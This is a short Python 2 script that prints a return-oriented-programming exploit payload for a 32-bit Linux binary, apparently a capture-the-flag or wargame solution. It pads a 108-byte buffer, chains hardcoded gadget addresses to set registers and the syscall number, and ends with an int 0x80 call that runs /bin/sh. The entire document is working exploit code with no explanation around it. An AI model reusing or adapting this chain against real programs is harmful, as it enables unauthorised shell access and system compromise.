shell = "/bin/sh"
shellptr = "\x3c\x7e\xfe\xbf"
popebx = "\xc2\x73\x05\x08"
movebxeax = "\xb4\x85\x05\x08"
inceax = "\x1c\x0c\x05\x08"
popall = '\xc0\x73\x05\x08'
intx80 = "\x93\x74\x05\x08"
nullptr = "\x4c\x7e\xfe\xbf"
print "a"*108+"\x01"*4+popebx+"\xff"*4+movebxeax+"a"*16+(inceax+"aaaa")*12+popall+nullptr+nullptr+shellptr+intx80+shell+"\x00"

